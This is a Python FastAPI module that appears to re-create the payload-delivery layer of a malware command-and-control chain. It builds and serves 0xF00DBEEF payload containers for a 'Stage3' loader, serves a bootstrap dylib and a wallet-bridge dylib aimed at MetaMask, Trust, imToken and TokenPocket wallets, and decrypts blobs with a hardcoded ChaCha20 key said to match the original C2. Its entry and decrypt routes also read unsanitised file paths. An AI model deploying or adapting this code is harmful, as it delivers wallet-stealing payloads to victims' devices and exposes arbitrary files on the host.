"""
L2 — Payload CDN & Dynamic Crypto Pipeline

Responsibilities:
  1. Read /payloads/manifest.json and expose the entry index.
  2. Serve individual entry files (dylib / bin) from /payloads/<hash>/<entry>.
  3. Build F00DBEEF containers on-the-fly (mirrors Stage3_VariantB.buildContainer).
  4. Verify container integrity (magic 0xF00DBEEF, entry count, offsets).
  5. Provide a ChaCha20-decrypt + LZMA-decompress validation pipeline for
     the original encrypted blobs in /downloaded/ (magic 0x0BEDF00D).
"""

from __future__ import annotations

import json
import lzma
import struct
from pathlib import Path
from typing import Any

from fastapi import APIRouter, HTTPException
from fastapi.responses import Response
from pydantic import BaseModel

from .state import app_state, LayerStatus

router = APIRouter(tags=["L2 · Payload CDN"])

MAGIC_F00DBEEF = 0xF00DBEEF
MAGIC_0BEDF00D = 0x0BEDF00D


# ── Manifest Loading ─────────────────────────────────────────────────────────

def _payload_root() -> Path:
    return Path(app_state.payload_root)


def _load_manifest() -> dict[str, Any]:
    if app_state.payload_manifest is not None:
        return app_state.payload_manifest

    manifest_path = _payload_root() / "manifest.json"
    if not manifest_path.exists():
        raise HTTPException(404, f"manifest.json not found at {manifest_path}")

    with open(manifest_path, "r") as f:
        app_state.payload_manifest = json.load(f)

    hashes = app_state.payload_manifest
    total = len(hashes)
    app_state.layers["L2"].metrics["cdn_nodes"] = f"{total}/{total}"
    app_state.layers["L2"].status = LayerStatus.ACTIVE

    return app_state.payload_manifest


def _record_payload_hit(kind: str = "request") -> None:
    app_state.payload_requests += 1
    app_state.layers["L2"].metrics["cache_hit"] = f"{app_state.payload_requests} req"
    if app_state.payload_requests > 0:
        app_state.layers["L2"].status = LayerStatus.ACTIVE


# ── F00DBEEF Container Builder ───────────────────────────────────────────────

def build_f00dbeef_container(hash_name: str) -> bytes:
    """
    Mirrors Stage3_VariantB.js `buildContainer()`:
      - Header: uint32 magic (0xF00DBEEF) + uint32 entry_count
      - Entry table: N * (uint32 f1, uint32 f2, uint32 data_offset, uint32 data_size)
      - Concatenated entry data
    """
    manifest = _load_manifest()
    if hash_name not in manifest:
        raise HTTPException(404, f"Hash not in manifest: {hash_name}")

    entries = manifest[hash_name]

    # Raw file shortcut (e.g. 7a7d9909... download list)
    if len(entries) == 1 and entries[0].get("raw"):
        raw_path = _payload_root() / hash_name / entries[0]["file"]
        if not raw_path.exists():
            raise HTTPException(404, f"Raw file missing: {raw_path}")
        return raw_path.read_bytes()

    # Read all entry files
    entry_data: list[bytes] = []
    for ent in entries:
        fpath = _payload_root() / hash_name / ent["file"]
        if not fpath.exists():
            raise HTTPException(404, f"Entry file missing: {fpath}")
        entry_data.append(fpath.read_bytes())

    # Assemble container
    n = len(entries)
    header_size = 8 + 16 * n
    total_size = header_size + sum(len(d) for d in entry_data)

    buf = bytearray(total_size)
    struct.pack_into("<II", buf, 0, MAGIC_F00DBEEF, n)

    data_offset = header_size
    for i, ent in enumerate(entries):
        table_off = 8 + i * 16
        struct.pack_into(
            "<IIII", buf, table_off,
            ent.get("f1", 0),
            ent.get("f2", 0),
            data_offset,
            len(entry_data[i]),
        )
        buf[data_offset:data_offset + len(entry_data[i])] = entry_data[i]
        data_offset += len(entry_data[i])

    return bytes(buf)


# ── Container Verifier ───────────────────────────────────────────────────────

def verify_f00dbeef(data: bytes) -> dict:
    """Parse and validate a F00DBEEF container, return structure info."""
    if len(data) < 8:
        return {"valid": False, "error": "Too short for header"}

    magic, count = struct.unpack_from("<II", data, 0)
    if magic != MAGIC_F00DBEEF:
        return {"valid": False, "error": f"Bad magic: 0x{magic:08X}, expected 0xF00DBEEF"}

    min_size = 8 + 16 * count
    if len(data) < min_size:
        return {"valid": False, "error": f"Truncated: {len(data)} < {min_size}"}

    entries_info = []
    for i in range(count):
        off = 8 + i * 16
        f1, f2, d_off, d_size = struct.unpack_from("<IIII", data, off)
        if d_off + d_size > len(data):
            return {"valid": False, "error": f"Entry {i} overflows: offset={d_off} size={d_size}"}
        entries_info.append({
            "index": i,
            "f1": f1, "f1_hex": f"0x{f1:08X}",
            "f2": f2,
            "data_offset": d_off,
            "data_size": d_size,
        })

    return {
        "valid": True,
        "magic": "0xF00DBEEF",
        "entry_count": count,
        "total_bytes": len(data),
        "entries": entries_info,
    }


# ── ChaCha20 Decrypt (for original encrypted blobs) ─────────────────────────

def chacha20_decrypt(data: bytes, key: bytes, nonce: bytes = b"\x00" * 8) -> bytes:
    """
    DJB ChaCha20, nonce=0, 20 rounds — matches the original C2 encryption.
    Key: 32 bytes derived from fqMaGkN4 → UTF-16LE → hex.
    """
    try:
        from Crypto.Cipher import ChaCha20 as _ChaCha20
        cipher = _ChaCha20.new(key=key, nonce=nonce)
        return cipher.decrypt(data)
    except ImportError:
        raise HTTPException(500, "PyCryptodome not installed (pip install pycryptodome)")


def lzma_decompress_0bedf00d(data: bytes) -> bytes:
    """
    Decompress an 0x0BEDF00D-prefixed LZMA blob.
    Format: uint32 magic (0x0BEDF00D) + uint32 decompressed_size + LZMA stream.
    Apple compression variant with method 0x306.
    """
    if len(data) < 8:
        raise ValueError("Data too short for 0BEDF00D header")

    magic = struct.unpack_from("<I", data, 0)[0]
    if magic != MAGIC_0BEDF00D:
        raise ValueError(f"Bad magic: 0x{magic:08X}, expected 0x0BEDF00D")

    raw_lzma = data[8:]
    try:
        return lzma.decompress(raw_lzma)
    except lzma.LZMAError:
        # Fallback: try with raw LZMA decompressor
        dec = lzma.LZMADecompressor(format=lzma.FORMAT_ALONE)
        return dec.decompress(raw_lzma)


# ── Request Models ───────────────────────────────────────────────────────────

class DecryptRequest(BaseModel):
    file_path: str
    key_hex: str = "b38fd1ccd6570d8b3ce8edabd740e60d97e93a44fb27b35f2c54c473a37ce676"


class VerifyRequest(BaseModel):
    hash_name: str


# ── Routes ───────────────────────────────────────────────────────────────────

@router.get("/api/payload/manifest/raw", summary="L2 Raw manifest for Stage3 loader")
async def get_manifest_raw():
    _record_payload_hit("manifest")
    manifest = _load_manifest()
    return manifest


@router.get("/api/payload/manifest", summary="L2 Full payload manifest")
async def get_manifest():
    _record_payload_hit("manifest")
    manifest = _load_manifest()
    summary = {}
    for h, entries in manifest.items():
        summary[h] = {
            "entry_count": len(entries),
            "entries": [
                {
                    "file": e.get("file", ""),
                    "type": e.get("type", 0),
                    "type_hex": f"0x{e.get('type', 0):02X}",
                    "size": e.get("size", 0),
                    "f1": e.get("f1", 0),
                    "f1_hex": f"0x{e.get('f1', 0):08X}",
                    "raw": e.get("raw", False),
                }
                for e in entries
            ],
            "total_size": sum(e.get("size", 0) for e in entries),
        }
    return {"code": 0, "data": summary}


@router.get("/api/payload/container/{hash_name}", summary="L2 Build & serve F00DBEEF container")
async def serve_container(hash_name: str):
    """Build and return the F00DBEEF container for a given hash."""
    _record_payload_hit("container")
    container = build_f00dbeef_container(hash_name)
    return Response(
        content=container,
        media_type="application/octet-stream",
        headers={
            "Content-Disposition": f"attachment; filename={hash_name}.f00dbeef",
            "X-Container-Magic": "0xF00DBEEF",
            "X-Container-Size": str(len(container)),
        },
    )


@router.get("/api/payload/bootstrap", summary="L2 Serve bootstrap.dylib")
async def serve_bootstrap():
    _record_payload_hit("bootstrap")
    fpath = _payload_root() / "bootstrap.dylib"
    if not fpath.exists():
        raise HTTPException(404, "bootstrap.dylib not found")
    data = fpath.read_bytes()
    return Response(
        content=data,
        media_type="application/x-mach-binary",
        headers={"Content-Disposition": "attachment; filename=bootstrap.dylib"},
    )


@router.get("/api/payload/wallet_bridge", summary="L2 Serve wallet_bridge.dylib")
async def serve_wallet_bridge():
    """Wallet keychain/sign helper dylib (MetaMask/Trust/imToken/TokenPocket)."""
    _record_payload_hit("wallet_bridge")
    fpath = _payload_root() / "wallet_bridge.dylib"
    if not fpath.exists():
        raise HTTPException(
            404,
            "wallet_bridge.dylib not found — run bootstrap_wallet/build.sh on macOS with Xcode iOS SDK",
        )
    data = fpath.read_bytes()
    return Response(
        content=data,
        media_type="application/x-mach-binary",
        headers={"Content-Disposition": "attachment; filename=wallet_bridge.dylib"},
    )


@router.post("/api/payload/verify", summary="L2 Verify F00DBEEF container integrity")
async def verify_container(body: VerifyRequest):
    """Build container and verify its structural integrity."""
    container = build_f00dbeef_container(body.hash_name)
    result = verify_f00dbeef(container)
    return {"code": 0, "data": result}


@router.get("/api/payload/entry/{hash_name}/{entry_file}", summary="L2 Serve individual entry file")
async def serve_entry(hash_name: str, entry_file: str):
    """Serve a single entry file (dylib/bin) from the payload directory."""
    _record_payload_hit("entry")
    fpath = _payload_root() / hash_name / entry_file
    if not fpath.exists():
        raise HTTPException(404, f"Entry not found: {hash_name}/{entry_file}")

    data = fpath.read_bytes()
    content_type = "application/octet-stream"
    if entry_file.endswith(".dylib"):
        content_type = "application/x-mach-binary"

    return Response(
        content=data,
        media_type=content_type,
        headers={"Content-Disposition": f"attachment; filename={entry_file}"},
    )


@router.post("/api/payload/decrypt-verify", summary="L2 ChaCha20 decrypt + LZMA decompress pipeline")
async def decrypt_and_verify(body: DecryptRequest):
    """
    Full crypto pipeline for original encrypted blobs:
      ChaCha20(key, nonce=0) → check 0x0BEDF00D magic → LZMA decompress → F00DBEEF verify
    """
    fpath = Path(body.file_path)
    if not fpath.exists():
        raise HTTPException(404, f"File not found: {body.file_path}")

    key = bytes.fromhex(body.key_hex)
    if len(key) != 32:
        raise HTTPException(400, "Key must be 32 bytes (64 hex chars)")

    encrypted = fpath.read_bytes()

    # Step 1: ChaCha20 decrypt
    try:
        decrypted = chacha20_decrypt(encrypted, key)
    except Exception as e:
        return {"code": 1, "error": f"ChaCha20 decrypt failed: {e}"}

    # Step 2: Check for 0BEDF00D magic and decompress
    magic = struct.unpack_from("<I", decrypted, 0)[0] if len(decrypted) >= 4 else 0
    decompressed = None
    if magic == MAGIC_0BEDF00D:
        try:
            decompressed = lzma_decompress_0bedf00d(decrypted)
        except Exception as e:
            return {
                "code": 2,
                "stage": "lzma_decompress",
                "error": str(e),
                "decrypted_magic": f"0x{magic:08X}",
                "decrypted_size": len(decrypted),
            }
    else:
        decompressed = decrypted

    # Step 3: Verify F00DBEEF structure
    result = verify_f00dbeef(decompressed)
    result["pipeline"] = {
        "encrypted_size": len(encrypted),
        "decrypted_size": len(decrypted),
        "decrypted_magic": f"0x{magic:08X}",
        "decompressed_size": len(decompressed),
    }

    return {"code": 0, "data": result}


@router.get("/api/payload/status", summary="L2 CDN pipeline status")
async def cdn_status():
    manifest = _load_manifest()
    total_hashes = len(manifest)
    total_entries = sum(len(v) for v in manifest.values())

    # Check which files actually exist on disk
    available = 0
    missing = []
    for h, entries in manifest.items():
        all_ok = True
        for e in entries:
            fpath = _payload_root() / h / e["file"]
            if not fpath.exists():
                missing.append(f"{h}/{e['file']}")
                all_ok = False
        if all_ok:
            available += 1

    return {
        "code": 0,
        "data": {
            "total_bundles": total_hashes,
            "available_bundles": available,
            "total_entries": total_entries,
            "missing_files": missing[:20],
            "request_count": app_state.payload_requests,
            "layer_status": app_state.layers["L2"].status.value,
            "cache_hit": app_state.layers["L2"].metrics.get("cache_hit", "0 req"),
        },
    }
